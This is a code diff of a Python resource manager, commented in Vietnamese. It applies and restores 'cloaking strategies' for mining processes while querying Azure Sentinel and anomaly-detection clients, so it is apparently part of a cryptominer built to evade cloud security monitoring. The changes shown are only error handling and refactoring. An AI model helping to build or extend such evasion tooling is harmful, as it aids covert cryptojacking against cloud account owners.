@@ -11,7 +11,7 @@ from queue import PriorityQueue, Empty, Queue
 from threading import Event, Lock
 from concurrent.futures import ThreadPoolExecutor
 from itertools import count
-from contextlib import contextmanager  # Import for context manager
+from contextlib import contextmanager
 
 from readerwriterlock import rwlock
 
@@ -20,14 +20,15 @@ from .base_manager import BaseManager
 from .utils import MiningProcess, GPUManager
 from .cloak_strategies import CloakStrategy, CloakStrategyFactory
 from .cgroup_manager import CgroupManager  # Import CgroupManager
+from .resource_control import ResourceControlFactory  # Import ResourceControlFactory
 
 # CHỈ GIỮ LẠI các import từ azure_clients TRỪ AzureTrafficAnalyticsClient
 from .azure_clients import (
     AzureSentinelClient,
     AzureLogAnalyticsClient,
     AzureNetworkWatcherClient,
-    # AzureTrafficAnalyticsClient đã được loại bỏ
     AzureAnomalyDetectorClient
+    # AzureTrafficAnalyticsClient đã được loại bỏ
     # AzureOpenAIClient đã được loại bỏ
 )
 
@@ -164,8 +165,8 @@ class SharedResourceManager:
                 strategy_name,
                 self.config,
                 self.logger,
-                self.cgroup_manager,          
-                self.is_gpu_initialized()    
+                self.cgroup_manager,
+                self.get_resource_managers()
             )
 
             if not strategy:
@@ -175,10 +176,14 @@ class SharedResourceManager:
                 self.logger.error(f"Invalid strategy: {strategy.__class__.__name__} does not implement a callable 'apply' method.")
                 return
 
-            self.logger.info(f"Bắt đầu áp dụng chiến lược '{strategy_name}' cho {name} (PID: {pid})")
+            self.logger.info(f"Bắt đầu áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid})")
             strategy.apply(process, cgroups)  # Các điều chỉnh tài nguyên được thực hiện trực tiếp bởi strategy
-            self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy_name}' cho {name} (PID: {pid}).")
+            self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid}).")
 
+        except psutil.NoSuchProcess as e:
+            self.logger.error(f"Tiến trình không tồn tại: {e}")
+        except psutil.AccessDenied as e:
+            self.logger.error(f"Không đủ quyền để áp dụng cloaking '{strategy_name}' cho PID {process.pid}: {e}")
         except Exception as e:
             self.logger.error(
                 f"Lỗi không xác định khi áp dụng cloaking '{strategy_name}' cho {name} (PID={pid}): {e}\n{traceback.format_exc()}"
@@ -277,25 +282,39 @@ class SharedResourceManager:
                         self.config,
                         self.logger,
                         self.cgroup_manager,
-                        self.is_gpu_initialized()
+                        self.get_resource_managers()
                     )
                     if strategy and callable(getattr(strategy, 'restore', None)):
                         self.logger.info(f"Khôi phục chiến lược '{strategy_name}' cho {name} (PID: {pid})")
                         strategy.restore(process, limits)
                     else:
                         self.logger.error(f"Không thể khôi phục chiến lược '{strategy_name}' cho {name} (PID: {pid})")
-            
+
             # Xóa trạng thái ban đầu
             del self.original_resource_limits[pid]
             self.logger.info(
                 f"Khôi phục xong tài nguyên cho {name} (PID: {pid})."
             )
+        except psutil.NoSuchProcess as e:
+            self.logger.error(f"Tiến trình không tồn tại khi khôi phục: {e}")
+        except psutil.AccessDenied as e:
+            self.logger.error(f"Không đủ quyền để khôi phục cloaking cho PID {process.pid}: {e}")
         except Exception as e:
             self.logger.error(
-                f"Lỗi restore_resources cho {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
+                f"Lỗi khi khôi phục cloaking cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
             )
             raise
 
+    def get_resource_managers(self) -> Dict[str, Any]:
+        """
+        Tạo và trả về các Resource Manager cần thiết từ resource_control.py.
+
+        Returns:
+            Dict[str, Any]: Dictionary chứa các Resource Manager.
+        """
+        # Giả sử ResourceControlFactory có phương thức tạo các resource manager dựa trên tên
+        resource_managers = ResourceControlFactory.create_all_managers(self.config, self.logger)
+        return resource_managers
 
 class ResourceManager(BaseManager):
     """
@@ -398,10 +417,6 @@ class ResourceManager(BaseManager):
             self.logger.info(f"Khám phá {len(self.nsgs)} NSGs.")
 
             # Đã loại bỏ việc khám phá Traffic Analytics Workspaces
-            # self.traffic_analytics_workspaces = self.azure_traffic_analytics_client.get_traffic_workspace_ids()
-            # self.logger.info(
-            #     f"Khám phá {len(self.traffic_analytics_workspaces)} Traffic Analytics Workspaces."
-            # )
             self.logger.info("Khám phá Traffic Analytics Workspaces đã bị loại bỏ.")
 
         except Exception as e:
@@ -705,7 +720,7 @@ class ResourceManager(BaseManager):
                                 self.config,
                                 self.logger,
                                 self.cgroup_manager,
-                                self.shared_resource_manager.is_gpu_initialized()
+                                self.shared_resource_manager.get_resource_managers()
                             )
                             self.shared_resource_manager.strategy_cache[strategy] = strategy_instance
                         else:
@@ -917,6 +932,9 @@ class ResourceManager(BaseManager):
 
             self.logger.debug(f"Metrics for PID {process.pid}: {metrics}")
             return metrics
+        except psutil.NoSuchProcess:
+            self.logger.warning(f"Tiến trình PID={process.pid} không tồn tại khi thu thập metrics.")
+            return {}
         except Exception as e:
             self.logger.error(
                 f"Lỗi collect_metrics cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
@@ -970,3 +988,4 @@ class ResourceManager(BaseManager):
         self.cgroup_manager.delete_cgroup('priority_cpu')
         self.logger.info("ResourceManager đã dừng.")
         shutdown_power_management()  # Gọi hàm shutdown_power_management trực tiếp
+
